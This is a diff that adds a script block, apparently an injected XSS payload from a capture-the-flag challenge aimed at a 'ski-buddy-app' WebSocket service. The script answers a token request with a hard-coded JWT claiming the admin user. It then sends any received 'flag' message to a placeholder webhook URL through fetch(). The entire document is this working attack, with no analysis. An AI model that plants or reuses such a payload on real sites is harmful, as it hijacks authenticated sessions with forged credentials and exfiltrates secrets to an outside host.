@@ -1,0 +1,14 @@
+<script>
+    const ws = new WebSocket('ws://ski-buddy-app:8000/ws');
+    ws.onmessage = (e) => {
+        const data = JSON.parse(e.data);
+
+        if (data.type === "token") {
+            ws.send(JSON.stringify({ type: "auth", token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwidXNlcm5hbWUiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.lDM0EwlIImPfZa_Yx2-j9-StPLJEuTYHFjK_ukbnjbg" }));
+        }
+
+        if (data.type === "flag") {
+            fetch("https://<WEBHOOK_URL>?flag=" + encodeURIComponent(data.message));
+        }
+    };
+</script>
